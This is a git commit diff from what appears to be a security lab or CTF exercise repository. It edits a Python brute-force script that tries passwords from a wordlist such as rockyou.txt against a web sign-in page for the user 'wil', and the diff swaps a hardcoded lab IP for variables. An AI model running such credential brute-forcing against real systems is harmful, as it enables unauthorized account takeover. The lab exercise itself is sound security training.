1121cff691c3944f073930632541c619630abd4c
VatcheTavitian <VatcheTavitian86@gmail.com>
2025-03-13 18:44:42 +0400

    Draft

--- 04_Weak_Credentials_Sign_In/Resources/brute_force.py
+++ 04_Weak_Credentials_Sign_In/Resources/brute_force.py
@@ -5,7 +5,7 @@ error_message = "images/WrongAnswer.gif"
 try:
     with open("passwordlist.txt", 'r') as f: # Note!: You need to create a passwordlist.txt file with a list of passwords. We recommend using the rockyou.txt file from github
         for password in f:
-            url = f"http://10.18.125.219:8000/index.php?page=signin&username=wil&password={password.strip()}&Login=Login"
+            url = f"http://{IP}:{PORT}/index.php?page=signin&username=wil&password={password.strip()}&Login=Login"
             try:
                 req = requests.get(url)
                 if error_message not in req.text:
